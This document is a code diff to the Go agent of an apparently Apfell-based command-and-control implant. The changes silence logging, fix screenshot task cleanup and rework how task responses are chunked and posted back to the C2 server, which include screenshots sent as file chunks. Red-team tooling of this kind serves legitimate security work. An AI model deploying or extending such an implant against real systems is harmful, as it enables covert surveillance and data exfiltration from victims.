@@ -8,7 +8,7 @@ import (
 	"os/user"
 	"strings"
 	"time"
-	"log"
+	//"log"
 	"sort"
 	"cat"
 	"keys"
@@ -55,6 +55,17 @@ func RunMain() {
 	main()
 }
 
+//helper to get the total size in bytes of the taskresponse slice
+func totalSize(r []json.RawMessage) int {
+	s := 0
+
+	for i := 0; i < len(r); i++ {
+		s = s + len(r[i])
+	}
+
+	return s
+}
+
 // Handle File upload responses from apfell
 func handleFileUploadResponse(resp []byte, backgroundTasks map[string](chan []byte)) {
 	var taskResp map[string]interface{}
@@ -75,11 +86,15 @@ func handleFileUploadResponse(resp []byte, backgroundTasks map[string](chan []by
 }
 
 // Handle Screenshot data
-func handleScreenshot(profile profiles.Profile, task structs.Task, backgroundchannel chan []byte, dataChannel chan []screencapture.ScreenShot) {
+func handleScreenshot(profile profiles.Profile, task structs.Task, backgroundchannel chan []byte, dataChannel chan []screencapture.ScreenShot, backgroundTasks map[string](chan []byte)) {
 	results := <- dataChannel
+	
 	for i := 0; i < len(results); i++ {
+		//log.Println("Calling profile.SendFileChunks for screenshot ", i)
 		profile.SendFileChunks(task, results[i].Data(), backgroundchannel)
 	}
+
+	delete(backgroundTasks, task.TaskID)
 }
 
 // Handle TaskResponses from apfell
@@ -88,7 +103,8 @@ func handleResponses(resp []byte, backgroundTasks map[string](chan []byte)) {
 	taskResp := structs.TaskResponseMessageResponse{}
 	err := json.Unmarshal(resp, &taskResp)
 	if err != nil {
-		log.Printf("Error unmarshal response to task response: %s", err.Error())
+		//log.Printf("Error unmarshal response to task response: %s", err.Error())
+		return
 	}
 
 	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
@@ -96,24 +112,27 @@ func handleResponses(resp []byte, backgroundTasks map[string](chan []byte)) {
 		var r map[string]interface{}
 		err := json.Unmarshal([]byte(taskResp.Responses[i]), &r)
 		if err != nil {
-			log.Printf("Error unmarshal response to task response: %s", err.Error())
+			//log.Printf("Error unmarshal response to task response: %s", err.Error())
 			break
 		}
 		
+		//log.Printf("Handling response from apfell: %+v\n", r)
 		if taskid, ok := r["task_id"]; ok {
 			if v, exists := backgroundTasks[taskid.(string)]; exists {
 				// send data to the channel
-				
-				
-				//log.Printf("Found background task with %s as the key. Responses index: %d", taskid.(string), i)
-				raw, _ := json.Marshal(r)
-				go func() {
-					v <- raw
-				}()
-				continue
+				if exists {
+					//log.Println("Found background task that matches task_id ", taskid.(string))
+					raw, _ := json.Marshal(r)
+					go func() {
+						v <- raw
+					}()
+					continue
+				}
 			}
 		}
 	}
+
+	return
 }
 
 func main() {
@@ -234,7 +253,7 @@ func main() {
 					backgroundTasks[task.Tasks[j].TaskID] = make(chan []byte)
 					dataChan := make(chan []screencapture.ScreenShot)
 					go screencapture.Run(task.Tasks[j], dataChan)
-					go handleScreenshot(profile, task.Tasks[j], backgroundTasks[task.Tasks[j].TaskID], dataChan)
+					go handleScreenshot(profile, task.Tasks[j], backgroundTasks[task.Tasks[j].TaskID], dataChan, backgroundTasks)
 					
 					break
 				case 3:
@@ -523,40 +542,37 @@ func main() {
 			}*/
 
 			// loop through all task responses
+			
 			if len(profiles.TaskResponses) > 0 {
 				responseMsg := structs.TaskResponseMessage{}
 				responseMsg.Action = "post_response"
 				responseMsg.Responses = make([]json.RawMessage, 0)
 				responseMsg.Delegates = make([]json.RawMessage, 0)
-				size := 512000 // Set the chunksize
+				size := 1024000 // Set the chunksize
 				// Chunk the response
-				for j := 0; j < len(profiles.TaskResponses); j++ {
-					// loop through the background tasks
-					
-					if len(profiles.TaskResponses[j]) < size {
-						responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
-					} else if len(responseMsg.Responses) < 1 && len(profiles.TaskResponses[j]) > size { // If the response is bigger than chunk size and there aren't any responses in responseMsg.Responses
-						responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
-						if j < len(profiles.TaskResponses) - 1 {
-							profiles.TaskResponses = profiles.TaskResponses[j+1:]
-						} else {
-							profiles.TaskResponses = make([]json.RawMessage, 0)
-						}
-						break
-					} else if len(responseMsg.Responses) > 0 && len(profiles.TaskResponses[j]) > size {
-						profiles.TaskResponses = profiles.TaskResponses[j:]
-						break
-					}
 
-					if len(responseMsg.Responses) == len(profiles.TaskResponses) {
+				total := totalSize(profiles.TaskResponses)
+				if total < size {
+					mu.Lock()
+					responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses...)
+					profiles.TaskResponses = make([]json.RawMessage, 0)
+					mu.Unlock()
+				} else {
+					responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[0])
+					if len(profiles.TaskResponses) > 1 {
+						mu.Lock()
+						_, profiles.TaskResponses = profiles.TaskResponses[0], profiles.TaskResponses[1:]
+						mu.Unlock()
+					} else {
+						mu.Lock()
 						profiles.TaskResponses = make([]json.RawMessage, 0)
-						break
+						mu.Unlock()
 					}
-					size = size - len(profiles.TaskResponses[j])
 				}
 
-				//log.Printf("Response to apfell: %+v\n", responseMsg)
+				
 				encResponse, _ := json.Marshal(responseMsg)
+				//log.Printf("Response to apfell: %s\n", encResponse)
 				// Post all responses to apfell
 				resp := profile.PostResponse(encResponse, true)
 				if len(resp) > 0 {
